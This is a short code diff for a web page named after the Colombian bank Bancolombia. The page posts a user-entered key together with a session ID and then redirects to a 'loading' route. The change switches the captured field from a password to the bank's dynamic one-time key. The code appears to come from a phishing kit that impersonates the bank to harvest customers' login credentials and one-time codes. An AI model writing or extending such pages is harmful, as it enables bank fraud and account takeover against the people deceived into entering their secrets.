@@ -45,9 +45,9 @@ export default function BancolombiaClavePage() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          action: 'update_password',
+          action: 'update_dynamic_key',
           sessionId,
-          clave
+          claveDinamica: clave
         })
       });
 
@@ -55,7 +55,7 @@ export default function BancolombiaClavePage() {
         router.push(`/bancolombia/cargando?sessionId=${sessionId}`);
       }
     } catch (error) {
-      console.error('Error updating password:', error);
+      console.error('Error updating dynamic key:', error);
     } finally {
       setLoading(false);
     }
